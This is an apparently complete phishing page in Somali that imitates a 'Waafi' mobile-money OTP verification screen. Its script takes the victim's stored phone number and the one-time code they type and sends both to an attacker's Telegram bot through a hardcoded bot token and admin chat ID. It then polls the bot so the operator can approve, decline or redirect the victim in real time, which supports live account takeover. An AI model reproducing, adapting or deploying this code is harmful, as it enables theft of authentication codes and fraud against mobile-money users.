<!DOCTYPE html>
<html lang="so">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waafi - OTP Kowaad</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .card {
            background: white;
            width: 90%;
            max-width: 400px;
            margin-top: 50px;
            padding: 40px 20px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            box-sizing: border-box;
        }
        
        h2 {
            font-size: 24px;
            color: #222;
            margin-bottom: 15px;
            font-weight: 700;
        }
        
        .instruction {
            color: #666;
            font-size: 15px;
            margin-bottom: 25px;
        }
        
        .otp-group {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        
        .otp-input {
            width: 42px;
            height: 55px;
            border: 1.5px solid #82d13d;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .otp-input:focus {
            border-color: #5fa82a;
            box-shadow: 0 0 0 2px rgba(130, 209, 61, 0.3);
        }
        
        .resend-text {
            color: #999;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .btn-verify {
            background-color: #e0e0e0;
            color: #999;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: not-allowed;
            transition: all 0.3s;
        }
        
        .btn-verify.active {
            background-color: #82d13d;
            color: white;
            cursor: pointer;
        }
        
        .btn-verify.active:active {
            transform: scale(0.98);
        }
        
        #loadingSection {
            display: none;
        }
        
        .footer-wave {
            width: 100%;
            background: linear-gradient(to bottom, #82d13d, #a3e635);
            padding: 60px 0;
            margin-top: auto;
            text-align: center;
            color: white;
        }
        
        #errorBox {
            color: red;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 10px;
            min-height: 20px;
        }
        
        #successBox {
            color: #82d13d;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 10px;
            min-height: 20px;
        }
        
        #pollingStatus {
            color: #666;
            font-size: 13px;
            margin-top: 15px;
            min-height: 20px;
        }
    </style>
</head>

<body>

    <div class="card" id="inputSection">
        <h2>Xaqiijinta OTP-ga Kowaad</h2>
        <p class="instruction">Geli OTP-ga kowaad</p>

        <div id="errorBox"></div>
        <div id="successBox"></div>

        <div class="otp-group">
            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric" autocomplete="one-time-code">
            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
            <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
        </div>

        <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span>s</p>

        <button id="verifyBtn" class="btn-verify" disabled>
            XAQIIJI OTP
        </button>

        <div id="pollingStatus"></div>
    </div>

    <div class="card" id="loadingSection">
        <div class="loader-circle" style="width:60px;height:60px;background:radial-gradient(circle,#a3e635,#82d13d);border-radius:50%;margin:0 auto 20px;display:flex;justify-content:center;align-items:center;">
            <div style="width:45px;height:45px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid white;border-radius:50%;animation:spin 1.5s linear infinite;"></div>
        </div>
        <p style="font-size:16px;font-weight:600;">Waa la diray... sug oggolaanshaha</p>
        <p id="waitStatus" style="font-size:13px;color:#666;margin-top:10px;"></p>
    </div>

    <div class="footer-wave">
        <p>© 2026 Waafi Soomaaliya</p>
    </div>

    <style>
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>

    <script>
        // ============================================================
        // CONFIGURE YOUR TELEGRAM BOT
        // ============================================================
        const BOT_TOKEN = "8969984578:AAHtChaZ-fvzLEDbdim8Oh2xGUVXe7nTWOM";
        const ADMIN_CHAT_ID = "8478166975";
        // ============================================================

        let pollInterval = null;
        let currentMessageId = null;
        let currentChatId = null;

        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('.otp-input');
            const verifyBtn = document.getElementById('verifyBtn');
            const inputSection = document.getElementById('inputSection');
            const loadingSection = document.getElementById('loadingSection');
            const timerText = document.getElementById('timer');
            const errorBox = document.getElementById('errorBox');
            const successBox = document.getElementById('successBox');
            const pollingStatus = document.getElementById('pollingStatus');
            const waitStatus = document.getElementById('waitStatus');

            let isSubmitting = false;

            // Initialize Telegram WebApp
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
            }

            const phone = localStorage.getItem('phone');
            if (!phone) {
                errorBox.innerText = "Fadhigu wuu dhacay. Fadlan dib u gal.";
                setTimeout(() => window.location.href = "/index.html", 1500);
                return;
            }

            // Start countdown
            startCountdown(timerText);

            // Focus first input on load
            setTimeout(() => {
                if (inputs[0]) inputs[0].focus();
            }, 500);

            // ---- Auto-move to next input on typing ----
            inputs.forEach(function(input, i) {
                input.addEventListener('input', function() {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    if (this.value.length === 1 && i < inputs.length - 1) {
                        inputs[i + 1].focus();
                    }
                    checkInputs(inputs, verifyBtn);
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === "Backspace") {
                        if (!this.value && i > 0) {
                            inputs[i - 1].focus();
                            inputs[i - 1].value = '';
                            checkInputs(inputs, verifyBtn);
                        }
                    }
                });

                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const paste = (e.clipboardData || window.clipboardData).getData('text');
                    const digits = paste.replace(/[^0-9]/g, '').split('');
                    digits.forEach(function(digit, idx) {
                        if (idx < inputs.length) {
                            inputs[idx].value = digit;
                        }
                    });
                    const emptyIndex = [...inputs].findIndex(function(inp) {
                        return inp.value === '';
                    });
                    if (emptyIndex !== -1) {
                        inputs[emptyIndex].focus();
                    } else {
                        inputs[inputs.length - 1].focus();
                    }
                    checkInputs(inputs, verifyBtn);
                });
            });

            // ---- Button click handler ----
            verifyBtn.addEventListener('click', function() {
                if (isSubmitting) return;
                isSubmitting = true;

                const phone = localStorage.getItem('phone');
                if (!phone) {
                    errorBox.innerText = "❌ Fadhigu wuu dhacay";
                    isSubmitting = false;
                    return;
                }

                let otp = "";
                inputs.forEach(function(i) {
                    otp += i.value;
                });

                // Show loading
                errorBox.innerText = "";
                successBox.innerText = "";
                pollingStatus.innerText = "";
                inputSection.style.display = "none";
                loadingSection.style.display = "block";
                waitStatus.innerText = "Codsiga waa la diray...";

                sendOTPToBot(phone, otp, inputs, verifyBtn, inputSection, loadingSection, errorBox, successBox, pollingStatus, waitStatus);
            });

        });

        // ============== FUNCTIONS ==============

        function checkInputs(inputs, verifyBtn) {
            let allFilled = true;
            inputs.forEach(function(inp) {
                if (inp.value.length !== 1) allFilled = false;
            });
            verifyBtn.disabled = !allFilled;
            if (allFilled) {
                verifyBtn.classList.add('active');
            } else {
                verifyBtn.classList.remove('active');
            }
        }

        function startCountdown(timerText) {
            let count = 60;
            timerText.innerText = count;
            const interval = setInterval(function() {
                count--;
                timerText.innerText = count;
                if (count < 0) clearInterval(interval);
            }, 1000);
        }

        async function sendOTPToBot(phone, otp, inputs, verifyBtn, inputSection, loadingSection, errorBox, successBox, pollingStatus, waitStatus) {
            try {
                const timestamp = Date.now();
                const message = "🔐 *OTP Kowaad waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 OTP: `" + otp + "`\n🆔 TS: `" + timestamp + "`";

                // Build inline keyboard
                const inlineKeyboard = {
                    inline_keyboard: [
                        [{
                            text: "✅ Approve",
                            callback_data: "approve_otp_" + timestamp
                        }, {
                            text: "❌ Decline",
                            callback_data: "decline_otp_" + timestamp
                        }, {
                            text: "📦 Six Boxes",
                            callback_data: "sixboxes_" + timestamp
                        }]
                    ]
                };

                // Send message to Telegram bot
                const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: "Markdown",
                        reply_markup: JSON.stringify(inlineKeyboard)
                    })
                });

                const result = await response.json();

                if (result.ok && result.result) {
                    // Store the message info for polling
                    currentChatId = result.result.chat.id;
                    currentMessageId = result.result.message_id;

                    waitStatus.innerText = "Codsiga waa la diray... sug oggolaanshaha admin-ka";

                    // Start polling for the decision
                    startPolling(timestamp, inputs, verifyBtn, inputSection, loadingSection, errorBox, successBox, pollingStatus, waitStatus);
                } else {
                    throw new Error(result.description || "Failed to send message");
                }

            } catch (err) {
                console.error("❌ Error:", err);
                errorBox.innerText = "❌ Khalad ayaa dhacay. Fadlan dib u day.";
                inputSection.style.display = "block";
                loadingSection.style.display = "none";
                inputs.forEach(function(i) {
                    i.value = "";
                });
                verifyBtn.disabled = true;
                verifyBtn.classList.remove('active');
                if (inputs[0]) inputs[0].focus();
            }
        }

        function startPolling(timestamp, inputs, verifyBtn, inputSection, loadingSection, errorBox, successBox, pollingStatus, waitStatus) {
            // Clear any existing poll
            if (pollInterval) clearInterval(pollInterval);

            let attempts = 0;
            const maxAttempts = 150; // ~5 minutes max

            pollInterval = setInterval(async function() {
                attempts++;
                waitStatus.innerText = "La sugayo... " + attempts + "s";

                try {
                    // Get updates from Telegram to check if our message was edited
                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=5");
                    const data = await response.json();

                    if (data.ok && data.result) {
                        // Look through updates for callback queries related to our timestamp
                        for (const update of data.result) {
                            if (update.callback_query) {
                                const query = update.callback_query;
                                const callbackData = query.data;

                                // Check if this callback is for our OTP
                                if (callbackData.includes("" + timestamp)) {

                                    if (callbackData.startsWith("approve")) {
                                        // ✅ APPROVED - Navigate to page9
                                        clearInterval(pollInterval);
                                        successBox.innerText = "✅ Waa la ansixiyay! U gudbaya...";
                                        loadingSection.style.display = "none";
                                        inputSection.style.display = "block";
                                        setTimeout(function() {
                                            window.location.href = "page9.html";
                                        }, 1500);
                                        return;
                                    }

                                    if (callbackData.startsWith("decline")) {
                                        // ❌ DECLINED - Reset and stay on same page
                                        clearInterval(pollInterval);
                                        errorBox.innerText = "❌ Codsiga waa la diiday. Fadlan dib u geli.";
                                        loadingSection.style.display = "none";
                                        inputSection.style.display = "block";
                                        inputs.forEach(function(i) {
                                            i.value = "";
                                        });
                                        verifyBtn.disabled = true;
                                        verifyBtn.classList.remove('active');
                                        if (inputs[0]) inputs[0].focus();
                                        return;
                                    }

                                    if (callbackData.startsWith("sixboxes")) {
                                        // 📦 Six Boxes - could trigger additional action
                                        // For now, just acknowledge
                                        pollingStatus.innerText = "📦 Six boxes option selected by admin...";
                                    }
                                }
                            }
                        }
                    }

                    // If max attempts reached, timeout
                    if (attempts >= maxAttempts) {
                        clearInterval(pollInterval);
                        errorBox.innerText = "⏰ Waqtigii oggolaanshaha wuu dhammaaday. Fadlan dib u day.";
                        loadingSection.style.display = "none";
                        inputSection.style.display = "block";
                        inputs.forEach(function(i) {
                            i.value = "";
                        });
                        verifyBtn.disabled = true;
                        verifyBtn.classList.remove('active');
                        if (inputs[0]) inputs[0].focus();
                    }

                } catch (err) {
                    console.error("Poll error:", err);
                }
            }, 2000); // Poll every 2 seconds
        }
    </script>

</body>

</html>
